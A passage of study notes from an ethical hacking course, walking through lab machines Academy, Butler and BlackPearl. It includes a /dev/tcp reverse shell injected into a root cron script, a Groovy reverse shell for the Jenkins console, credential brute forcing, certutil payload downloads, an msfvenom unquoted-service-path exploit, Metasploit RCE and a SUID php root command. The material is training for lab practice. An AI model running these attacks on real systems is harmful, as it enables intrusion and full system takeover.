- Download `pspy64` (process spy):

  ```bash
  wget http://<kali-ip>/pspy64
  chmod +x pspy64
  ./pspy64
  ```

- Watch processes.
- See:
  - `backup.sh` being run periodically (every minute) under root.

### Getting Access as Grimmy

- Confirm `grimmy` user exists in `/etc/passwd`.
- Use MySQL password discovered:
  - Try `ssh grimmy@<ip>` with `myverysecurepass`.
  - Successful login as Grimmy.

### Escalation to Root – Cron/Script Abuse

- Once logged in as Grimmy:
  - Edit `backup.sh` to include reverse shell:

  ```bash
  #!/bin/bash
  rm /tmp/backup.zip
  zip /tmp/backup.zip /var/www/html/academy/includes/*
  chmod 777 /tmp/backup.zip
  /bin/bash -i >& /dev/tcp/<kali-ip>/8081 0>&1
  ```

- Set listener:

  ```bash
  nc -nvlp 8081
  ```

- Wait for cron to run script.
- Receive root shell from reverse connection.
- Confirm:

  ```bash
  whoami
  hostname
  cat /root/flag.txt
  ```

---

## #51. Jenkins & Unquoted Service Path – Butler (Windows PrivEsc)

### Butler Machine – Jenkins Web Login

- IP discovered via DHCP.
- Nmap:
  - Port 8080 – Jenkins.
  - Port 7680 – Unknown.

- Visit:
  - `http://<ip>:8080/`:
    - Jenkins login form.

### Enumerating Jenkins

- Default creds:
  - `admin:password` – does not work.
- Check Jenkins exploit references:
  - Many require valid authentication.
- Plan:
  - Brute force web login.

### Burp Credential Brute Force

- Intercept login attempt:
  - Username: `admin`.
  - Password: `password`.
- Send request to Intruder.
- Set payload positions on:
  - Username
  - Password.
- Use `Cluster Bomb`:
  - Usernames: `admin`, `administrator`, `jenkins`.
  - Passwords:
    - `password`
    - `jenkins`
    - `Password`
    - `Jenkins`
    - `password1`.
- Run attack.
- Observe:
  - All 302 with length 318 except:
    - `jenkins:jenkins` with slightly different length/count.
- Test direct login:
  - `jenkins:jenkins` works.

### Jenkins Script Console RCE

- Jenkins Script Console uses Groovy.
- Search `Groovy reverse shell`.
- Use GitHub Groovy reverse shell:

  ```groovy
  String host="<kali-ip>";
  int port=8044;
  String cmd="cmd.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s=new Socket(host,port);
  InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
  OutputStream po=p.getOutputStream(), so=s.getOutputStream();
  while(!s.isClosed()){
    while(pi.available()>0)
      so.write(pi.read());
    while(pe.available()>0)
      so.write(pe.read());
    while(si.available()>0)
      po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
      p.exitValue();
      break;
    } catch (Exception e){}
  };
  p.destroy();
  s.close();
  ```

- Set netcat listener:

  ```bash
  nc -nvlp 8044
  ```

- Paste code in Jenkins script console and execute.
- Receive reverse shell as `butler` user.

### Windows Privilege Escalation with WinPEAS

- Download `winPEASx64.exe`:
  - Place in transfer folder on Kali.
- On Butler machine:
  - Use `certutil`:

    ```cmd
    certutil.exe -urlcache -f http://<kali-ip>/winpeas.exe winpeas.exe
    winpeas.exe
    ```

- WinPEAS output:
  - Highlights unquoted service path:
    - `C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe`
  - Service name:
    - `WiseBootAssistant`.
  - Runs as:
    - `LocalSystem`.
  - No quotes and there’s a space in path.

### Unquoted Service Path Attack

- Windows tries executing:
  1. `C:\Program.exe`
  2. `C:\Program Files.exe`
  3. `C:\Program Files (x86)\Wise.exe`
  4. `C:\Program Files (x86)\Wise\Wise.exe`
  5. etc.
- We can drop a malicious `Wise.exe` into:
  - `C:\Program Files (x86)\Wise\`.

### Creating Malicious EXE with msfvenom

- On Kali:

  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=7777 -f exe -o wise.exe
  ```

- Host `wise.exe` from Kali (`python3 -m http.server 80`).
- On Butler:

  ```cmd
  cd "C:\Program Files (x86)\Wise"
  certutil.exe -urlcache -f http://<kali-ip>/wise.exe wise.exe
  ```

### Starting Service

- Stop service:

  ```cmd
  sc stop WiseBootAssistant
  ```

- Confirm:

  ```cmd
  sc query WiseBootAssistant
  ```

- Set listener:

  ```bash
  nc -nvlp 7777
  ```

- Start service:

  ```cmd
  sc start WiseBootAssistant
  ```

- When service starts:
  - Windows runs `Wise.exe` as `LocalSystem`.
  - We receive shell as SYSTEM on port 7777.
- Confirm:

  ```cmd
  whoami
  ```

---

## #52. Navigate CMS & SUID PHP – BlackPearl (Linux PrivEsc)

### BlackPearl Setup

- VM `blackpearl` loaded.
- `nmap` shows:
  - 22/tcp – SSH
  - 80/tcp – HTTP (`nginx`)
  - 53/tcp – DNS.

### Nginx Default Page & DNS Recon

- Visit `http://<ip>`:
  - Nginx default page.
- Check page source:
  - Finds comment: `alec@blackpearl.tcm`.
- DNS Recon:

  ```bash
  dnsrecon -r 127.0.0.0/24 -n <ip> -d blah
  ```

- Output:
  - `blackpearl.tcm` pointing to localhost and actual IP.

### /etc/hosts Entry

- Edit `/etc/hosts`:

  ```bash
  sudo nano /etc/hosts
  ```

- Add:

  ```text
  192.168.138.130 blackpearl.tcm
  ```

- Restart Firefox.
- Visit:
  - `http://blackpearl.tcm/`

### Info Page & Directory Busting

- `http://blackpearl.tcm/`:
  - Nginx `my info` page.
- Use `ffuf`:

  ```bash
  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blackpearl.tcm/FUZZ
  ```

- Finds `/navigate/` path.

### Navigate CMS Vulnerability

- Navigate CMS version 2.8 found in page.
- Search:
  - `navigate cms 2.8 exploit`.
- Find:
  - Exploit: Unauthenticated RCE via `dbProtect.php` + path traversal.
- Metasploit module:
  - `exploit/multi/http/navigate_cms_rce`.

### Metasploit Exploitation

- In `msfconsole`:

  ```bash
  use exploit/multi/http/navigate_cms_rce
  set RHOSTS 192.168.138.130
  set VHOST blackpearl.tcm
  set TARGETURI /navigate/
  set LHOST <kali-ip>
  run
  ```

- Results:
  - Meterpreter shell.
  - `shell` to drop to interactive.
  - `whoami` → `www-data`.

### Privilege Escalation with LinPEAS & SUID PHP

- `wget` and run `linpeas.sh`:
  - Finds SUID `php7.3` binary in `/usr/bin/php7.3`.
- Also verify with:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

- GTFOBins:
  - For `php` with SUID:
    - Use:

    ```bash
    php7.3 -r 'posix_setuid(0); system("/bin/sh");'
    ```

- After running:
  - Shell as root:

    ```bash
    whoami
    id
    cat /root/flag.txt
    ```

---

## #53. Course Wrap-Up & Next Steps

### End of Free Course Segment

- The 12-hour (partial) course ends here.
- Heath thanks students for watching.
- Invites:
  - Continue to full Practical Ethical Hacking course.
  - Share the course with friends.
  - Subscribe on YouTube for more hacking content.

### Final Notes

- Full course also covers:
  - **Exploit development**
  - **Active Directory exploitation** (Heath’s favorite)
  - Deeper **web app** and **wireless** pentesting
  - **Post-exploitation** techniques
  - **Legal documentation**
  - **Report writing**
  - **Career guidance**
- Additional specialized courses:
  - Windows Privilege Escalation for Beginners
  - Linux Privilege Escalation for Beginners
  - External Pentest Playbook
  - And others listed at TCM Academy.

---

**End of Reorganized Transcript**